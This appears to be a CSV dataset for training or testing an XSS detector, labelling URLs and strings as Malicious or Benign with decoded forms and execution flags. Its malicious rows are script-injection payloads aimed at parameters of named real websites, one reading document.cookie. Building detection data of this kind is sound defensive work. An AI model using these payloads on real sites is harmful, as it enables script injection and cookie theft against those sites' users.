Payloads,Class,decoded,executed,parser_changed
http://www.rememberthemilk.com/login/?return=%2faccount%2forder%2f%27%22%3e%3c/title%3e%3cscript%3ea<br>lert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious,"http://www.rememberthemilk.com/login/?return=/account/order/'""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>",True,True
"<script>function openwin() {window.open(""http://www.w3schools.com"");}</script>",Benign,"<script>function openwin() {window.open(""http://www.w3schools.com"");}</script>",False,True
http://ladychic.com/index.php?page=5&amp;keyword=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://ladychic.com/index.php?page=5&keyword=""><script>alert(document.cookie)</script>",True,True
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=armando&password=7g7ai9ador&nombre=erberto&apellidos=delem%fas+picornel&email=junasz1%40barcas-hibridas.mobi&dni=12765802c&direccion=calle+rioja%2c+149+&ciudad=mas%f3%2c+la&cp=05134&provincia=valladolid&ntc=8096995007175801&b1=registrar,Benign,"http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=armando&password=7g7ai9ador&nombre=erberto&apellidos=delem�s picornel&email=junasz1@barcas-hibridas.mobi&dni=12765802c&direccion=calle rioja, 149 &ciudad=mas�, la&cp=05134&provincia=valladolid&ntc=8096995007175801&b1=registrar",False,False
http://www.wikihow.com/make-banana-pudding-in-harvest-moon:-animal-parade&t=1396649540612&n=6007598&k=mainentity,Benign,http://www.wikihow.com/make-banana-pudding-in-harvest-moon:-animal-parade&t=1396649540612&n=6007598&k=mainentity,False,False
registro&login=ferne&password=pech%2be&nombre=roth&apellidos=guinea+hinojar&email=milani4%40beautifulbody.sh&dni=89208475p&direccion=calle+venus%2c+81+2-a&ciudad=endrinal&cp=39806&provincia=guadalajara&ntc=8417338456175136&b1=registrar,Benign,"registro&login=ferne&password=pech e&nombre=roth&apellidos=guinea hinojar&email=milani4@beautifulbody.sh&dni=89208475p&direccion=calle venus, 81 2-a&ciudad=endrinal&cp=39806&provincia=guadalajara&ntc=8417338456175136&b1=registrar",False,False
http://www.idt.com/?catid=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.idt.com/?catid=""><script>alert(""maxwel"")</script>",True,True
http://www.gamink.lt/?s=%22%3cscript%3ealert(7)%3b%3c%2fscript%3e,Malicious,"http://www.gamink.lt/?s=""<script>alert(7);</script>",True,True
insertar&precio=5337&b1=pasar+por+caja,Benign,insertar&precio=5337&b1=pasar por caja,False,False
http://www.ontopia.net/omnigator/models/topic_complete.jsp?tm=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.ontopia.net/omnigator/models/topic_complete.jsp?tm=""><script>alert(""maxwel"")</script>",True,True
"it was pretty good. showreview(1155691, 'full');",Benign,"it was pretty good. showreview(1155691, 'full');",False,False
